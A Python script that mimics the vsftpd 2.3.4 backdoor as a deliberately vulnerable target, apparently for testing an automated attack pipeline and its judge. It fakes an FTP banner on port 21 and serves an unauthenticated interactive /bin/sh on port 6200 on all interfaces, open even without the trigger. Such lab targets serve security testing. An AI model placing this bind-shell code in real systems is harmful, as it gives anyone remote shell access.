#!/usr/bin/env python3
"""
Faithful mimic of the vsftpd 2.3.4 backdoor (CVE-2011-2523), for authorized
local Talon pipeline testing only.

- TCP 21: speaks just enough FTP to be fingerprinted by nmap as vsftpd 2.3.4.
  Any USER whose name contains the ":)" smiley triggers the backdoor.
- TCP 6200: on trigger, a real /bin/sh is served on this port (the actual
  backdoor behavior). Connecting and running `id` yields uid=0(root) -- the
  proof-of-compromise the judge looks for.

No third-party deps; standard library only.
"""
import os
import socket
import subprocess
import threading


def handle_ftp(conn, addr, state):
    try:
        conn.sendall(b"220 (vsFTPd 2.3.4)\r\n")
        buf = b""
        while True:
            data = conn.recv(1024)
            if not data:
                break
            buf += data
            while b"\r\n" in buf or b"\n" in buf:
                line, buf = buf.split(b"\n", 1) if b"\n" in buf else (buf, b"")
                line = line.strip().decode(errors="replace")
                upper = line.upper()
                # Backdoor trigger: a USER command whose payload contains ":)".
                if upper.startswith("USER ") and ":)" in line:
                    state["armed"] = True
                    conn.sendall(b"331 Please specify the password.\r\n")
                elif upper.startswith("USER "):
                    conn.sendall(b"331 Please specify the password.\r\n")
                elif upper.startswith("PASS"):
                    conn.sendall(b"230 Login successful.\r\n")
                elif upper in ("QUIT", "BYE"):
                    conn.sendall(b"221 Goodbye.\r\n")
                    return
                else:
                    conn.sendall(b"500 Unknown command.\r\n")
    except OSError:
        pass
    finally:
        conn.close()


def backdoor_shell(conn, addr):
    # Real interactive shell on the backdoor port -- dup the socket onto
    # stdin/stdout/stderr and exec /bin/sh, exactly like the original.
    try:
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        subprocess.Popen(["/bin/sh", "-i"]).wait()
    except OSError:
        pass
    finally:
        conn.close()


def serve(port, handler, state=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(8)
    while True:
        try:
            conn, addr = s.accept()
        except OSError:
            break
        if port == 6200:
            threading.Thread(target=backdoor_shell, args=(conn, addr), daemon=True).start()
        else:
            threading.Thread(target=handler, args=(conn, addr, state), daemon=True).start()


def main():
    state = {"armed": False}
    threading.Thread(target=serve, args=(21, handle_ftp, state), daemon=True).start()
    threading.Thread(target=serve, args=(6200, None), daemon=True).start()
    # Keep the 6200 listener up regardless of trigger so recon + codegen
    # PoCs have something to connect to either way.
    print("vuln-target: ftp on :21 (vsftpd 2.3.4 mimic), backdoor shell on :6200", flush=True)
    while True:
        threading.Event().wait(3600)


if __name__ == "__main__":
    main()
